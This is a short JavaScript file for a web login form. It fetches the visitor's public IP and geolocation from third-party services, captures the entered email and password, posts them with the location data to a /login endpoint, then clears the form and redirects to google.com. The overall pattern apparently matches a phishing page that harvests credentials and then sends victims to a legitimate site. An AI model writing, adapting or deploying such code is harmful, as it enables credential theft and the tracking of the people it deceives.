let userIPData = {}; // Store IP data

// Function to fetch user's IP
async function fetchIPData() {
    try {
        // Get public IP
        const ipResponse = await fetch("https://api64.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Get detailed IP information
        const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
        userIPData = await geoResponse.json();

        console.log("User IP Data:", userIPData);
    } catch (error) {
        console.error("Error fetching IP data:", error);
    }
}

// Call function on page load
fetchIPData();

// Handle login
document.querySelector('.submit').addEventListener('click', function (event) {
    event.preventDefault(); // Prevent form submission (if applicable)

    var email = document.getElementById('mail').value;
    var password = document.getElementById('pass').value;

    fetch("/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            email: email,
            password: password,
            ipData: userIPData  // Send stored IP data with login request
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log("Response:", data);
        // Redirect to Google only after the data is sent successfully
        window.location.href = "https://www.google.com";
    })
    .catch(error => {
        console.error("Error:", error);
    });

    // Reset fields
    document.getElementById("mail").value = "";
    document.getElementById("pass").value = "";
});
